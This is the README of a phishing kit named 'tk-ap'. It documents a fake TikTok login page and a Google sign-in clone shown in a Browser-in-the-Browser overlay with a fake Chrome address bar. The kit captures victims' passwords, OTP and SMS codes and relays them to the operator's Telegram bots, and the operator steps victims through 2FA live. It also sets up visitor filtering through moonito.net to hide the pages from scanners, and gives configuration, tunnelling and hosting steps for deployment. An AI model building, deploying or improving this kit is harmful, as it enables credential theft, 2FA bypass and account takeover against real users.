# tk-ap

A static frontend (`fe`), a PHP credential-collection app (`googlephish`), and a Node.js Express backend (`be`) for Telegram-gated approval.

**Email / phone + password (TikTok form)** — `POST` to `be`, poll until approved or rejected; optional 2FA round. No PHP involved.

**Sign in with Google** — a Browser-in-the-Browser (BITB) overlay loads `googlephish` in an iframe. The PHP flow sends captures to Telegram Bot B.

---

## Architecture

```
Browser (fe)
  │
  ├── POST /login + poll ───────→ be (Node) ──→ Telegram Bot A
  │
  └── BITB overlay (iframe) ────→ googlephish (PHP)
                                      └── Telegram Bot B
```

Run **`be`** whenever you use the TikTok email/password form. **`googlephish`** is only required for the Google button (BITB).

- **`fe/`** — Plain HTML/CSS/JS. No build step. Served statically.
- **`googlephish/`** — PHP pages cloning Google sign-in UI. Captures email, password, and OTP/SMS codes and pushes them to Telegram Bot B. The operator drives the victim step-by-step via Telegram inline buttons.
- **`be/`** — Express API. Receives TikTok-style login submissions, holds them as `pending`, and sends Telegram messages with Approve / Reject / 2FA inline keyboard buttons (Bot A).

---

## Prerequisites

| Tool | Min version |
|------|-------------|
| PHP | 8.0+ (local dev) |
| Docker | any recent (PHP container) |
| Node.js | 18+ (only if running `be`) |
| npm / yarn | any modern (only if running `be`) |

---

## Quick Start

### 1 — Clone

```bash
git clone <repo-url> tk-ap
cd tk-ap
```

### 2 — Configure the PHP app

Edit `googlephish/config.json`:

```json
{
    "afk_mode": false,
    "afk_interval": 5000,
    "telegram_token": "<Bot-B token from @BotFather>",
    "telegram_chat_id": "<your numeric chat/group ID>",
    "website_url": "https://your-phphost.example.com",
    "telegram_buttons": true
}
```

> `website_url` must be the **public HTTPS URL** where `googlephish` is reachable. The PHP app calls `setWebhook` automatically on every page load using `<website_url>/telegram_api.php`. For local dev, use an ngrok/cloudflared tunnel.

Also fill in the moonito.net traffic-filter keys in `googlephish/lib/config.php`:

```php
$apiPublicKey = '<your moonito public key>';
$apiSecretKey = '<your moonito secret key>';
```

Get keys at [https://moonito.net/api](https://moonito.net/api). Set `$isProtected = false` to skip filtering during development.

### 3 — Configure the frontend

Edit `fe/config.js`:

```js
window.APP_CONFIG = {
    apiBaseUrl: 'http://localhost:4000',
    authPollIntervalMs: 1500,
    authPollMaxMs: 3 * 60 * 1000,

    afterLoginRedirectUrl: 'https://www.google.com',
    afterLoginRedirectDelayMs: 0,

    googlephishBaseUrl: 'http://localhost:8080',

    bitbEntryPath: '/index.php',
    bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin',
    bitbTabTitle:   'Sign in - Google Accounts',
    bitbFaviconUrl: 'https://www.google.com/favicon.ico',
    bitbLabLabel: ''
};
```

- **`apiBaseUrl`** — Node `be` origin (no trailing slash). Used only for **Log in** (email/phone + password).
- **`googlephishBaseUrl`** — PHP app origin. Used only for **Sign in with Google** (BITB iframe). There is no Google SDK or OAuth client ID in the frontend.

### 4 — Configure the Node backend

Required for the TikTok **Log in** (password) flow.

```bash
cp be/.env.example be/.env
```

Edit `be/.env`:

```env
PORT=4000

TELEGRAM_BOT_TOKEN=<Bot-A token from @BotFather>
TELEGRAM_ADMIN_CHAT_ID=<your numeric chat/group ID>

# Recommended — must match the secret_token you pass to setWebhook
TELEGRAM_WEBHOOK_SECRET=<random string>

# Informational only — not read by the app; useful when running setWebhook manually
PUBLIC_BASE_URL=https://your-be-host.example.com
```

Then register Bot A's webhook once after deployment — see [Setting the Telegram Webhook (Bot A)](#setting-the-telegram-webhook-bot-a) below.

---

## Running locally

### PHP app (`googlephish`) — Docker (recommended)

```bash
cd googlephish
docker build -t googlephish .
docker run --rm -p 8080:80 googlephish
```

App is at `http://localhost:8080`.

> **Webhook note:** `website_url` in `config.json` must be a public HTTPS URL for Telegram webhooks to work. Use a tunnel:
> ```bash
> ngrok http 8080
> # or
> cloudflared tunnel --url http://localhost:8080
> ```
> Update `website_url` to the tunnel URL before starting the PHP server.

### PHP app — plain PHP built-in server

```bash
cd googlephish
php -S 127.0.0.1:8080
```

### Frontend (`fe`)

```bash
# Python
python3 -m http.server 3000 --directory fe

# npx serve
npx serve fe -l 3000
```

Open `http://localhost:3000`. **Log in** talks to `apiBaseUrl` (`be`). **Sign in with Google** opens BITB using `googlephishBaseUrl`.

### Node backend (`be`)

```bash
cd be
yarn install
yarn dev    # nodemon, auto-restart
# or
yarn start  # production
```

Server starts on `http://localhost:4000`.

---

## Setting the Telegram Webhook (Bot A)

Bot A is the Node backend webhook for Telegram inline-button presses (approve / reject / 2FA).

### Step 1 — Expose the backend

For local dev, use a tunnel:

```bash
ngrok http 4000
# → https://abc123.ngrok.io
```

For production (Render, Fly.io, etc.) use your public URL.

### Step 2 — Register the webhook

```bash
curl -X POST "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://abc123.ngrok.io/telegram/webhook",
    "secret_token": "<TELEGRAM_WEBHOOK_SECRET>"
  }'
```

- `url` must be HTTPS and publicly reachable.
- `secret_token` must exactly match `TELEGRAM_WEBHOOK_SECRET` in `be/.env`. If you leave `TELEGRAM_WEBHOOK_SECRET` empty, omit `secret_token` from the request (not recommended).

### Step 3 — Verify

```bash
curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/getWebhookInfo"
```

Look for `"url": "https://..."` and `"pending_update_count": 0`.

### Removing the webhook

```bash
curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/deleteWebhook"
```

---

## Setting the Telegram Webhook (Bot B — PHP)

Bot B is auto-configured. The PHP app calls `setWebhook` pointing at `<website_url>/telegram_api.php` on **every page load** — no manual step needed. Just make sure `website_url` in `googlephish/config.json` is a public HTTPS URL before the PHP app is started.

---

## Configuration Reference

### `fe/config.js`

| Key | Required | Description |
|-----|----------|-------------|
| `apiBaseUrl` | For password login | Node `be` origin, no trailing slash (`POST /login`, poll `/login-status`) |
| `authPollIntervalMs` | No | Milliseconds between status polls (default `1500`) |
| `authPollMaxMs` | No | Max time to poll before timeout (default `3` minutes) |
| `googlephishBaseUrl` | For Google button | Public URL of the PHP app (no trailing slash); BITB iframe only |
| `bitbEntryPath` | No | First PHP page in the BITB iframe (default `/index.php`) |
| `bitbDisplayUrl` | No | URL shown in the fake Chrome address bar |
| `bitbTabTitle` | No | Text of the fake Chrome tab |
| `bitbFaviconUrl` | No | Favicon in the fake Chrome tab |
| `bitbLabLabel` | No | Optional banner in the fake title bar; empty hides it |
| `afterLoginRedirectUrl` | No | Browser redirect after Telegram **approval** on password flow |
| `afterLoginRedirectDelayMs` | No | Delay before redirect (default `0`) |

### `googlephish/config.json`

| Key | Required | Description |
|-----|----------|-------------|
| `telegram_token` | **Yes** | Bot B token from @BotFather |
| `telegram_chat_id` | **Yes** | Operator chat/group ID for Bot B messages |
| `website_url` | **Yes** | Public HTTPS base URL of the PHP app; used for `setWebhook` |
| `telegram_buttons` | No | Show inline keyboard buttons in Telegram (default `true`) |
| `afk_mode` | No | Pause operator-driven page transitions (default `false`) |
| `afk_interval` | No | Browser polling interval in ms (default `5000`) |

### `googlephish/lib/config.php`

| Variable | Required | Description |
|----------|----------|-------------|
| `$apiPublicKey` | No | moonito.net public key for traffic filtering |
| `$apiSecretKey` | No | moonito.net secret key |
| `$isProtected` | No | Enable/disable visitor filtering (set `false` for local dev) |
| `$unwantedVisitorTo` | No | Redirect/iframe target for filtered-out visitors |
| `$unwantedVisitorAction` | No | `1` = redirect, `2` = iframe, `3` = load remote content |

### `be/.env`

| Variable | Required | Description |
|----------|----------|-------------|
| `PORT` | No | HTTP port (default `4000`) |
| `TELEGRAM_BOT_TOKEN` | **Yes** | Bot A token from @BotFather |
| `TELEGRAM_ADMIN_CHAT_ID` | **Yes** | Numeric chat/group ID for Bot A approval messages |
| `TELEGRAM_WEBHOOK_SECRET` | No | Secret token for webhook validation (recommended) |
| `PUBLIC_BASE_URL` | No | Informational note only — not read by the app |

---

## Node backend API Reference

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/login` | Submit login (`{ username, password }` or `{ credential }`). Returns `{ status: "pending", request_id }`. |
| `GET` | `/login-status?request_id=<id>` | Poll status: `pending` / `approved` / `rejected` / `2fa`. |
| `POST` | `/submit-2fa` | Submit 2FA code `{ request_id, code }`. |
| `POST` | `/telegram/webhook` | Telegram webhook receiver (called by Telegram, not the browser). |
| `GET` | `/health` | Returns `{ ok: true }`. |

---

## Deployment

### googlephish (PHP)

Deploy as a Docker container to any service that supports it (Render Web Service with Docker runtime, Fly.io, Railway, etc.):

```bash
cd googlephish
docker build -t googlephish .
```

Before building, set `website_url` in `config.json` to the final public URL of the service.

### fe (frontend)

Serve the `fe/` directory from any static host (Render Static Site, Netlify, Cloudflare Pages, Nginx, etc.). Before deploying, set **`apiBaseUrl`** to your deployed Node service and **`googlephishBaseUrl`** to your deployed PHP service (each can be on a different host).

### be (Node backend)

Deploy as a Node 18 web service for the password login path. Set all `be/.env` variables in your hosting dashboard. After deploying, run the `setWebhook` curl command once.

---

## Project Structure

```
tk-ap/
├── be/                          # Node.js Express API (TikTok password + Telegram Bot A)
│   ├── .env.example
│   ├── package.json
│   ├── server.js
│   └── src/
│       ├── app.js
│       ├── config.js
│       ├── lib/
│       │   ├── clientIp.js
│       │   ├── store.js         # In-memory request store (TTL 2 min)
│       │   └── telegram.js      # Telegram API wrapper
│       └── routes/
│           ├── health.js
│           ├── login.js
│           └── telegram.js      # Webhook handler
├── fe/                          # Static frontend
│   ├── config.js                # apiBaseUrl (be) + googlephishBaseUrl (BITB)
│   ├── index.html
│   ├── main.js
│   ├── style.css
│   └── js/
│       ├── auth-api.js          # Password login → be (fetch + poll)
│       ├── auth-ui.js           # Loader, banners, 2FA view, redirect after approval
│       └── bitb-googlephish.js  # BITB iframe (Google button only)
└── googlephish/                 # PHP Google sign-in clone
    ├── Dockerfile
    ├── config.json              # Bot B token + operator chat ID + website_url
    ├── include.php              # Session bootstrap, setWebhook, Telegram helpers
    ├── telegram_api.php         # PHP Telegram webhook handler
    ├── index.php                # Email step
    ├── password.php             # Password step
    ├── 2-step.php               # 2-step verification step
    ├── sms.php                  # SMS code step
    ├── process.php              # POST handler / step router
    ├── lib/
    │   ├── config.php           # moonito.net API keys + visitor filter settings
    │   └── detector.php         # Visitor filtering logic
    └── telegram/                # Runtime: per-IP redirect instruction files (gitignored)
```
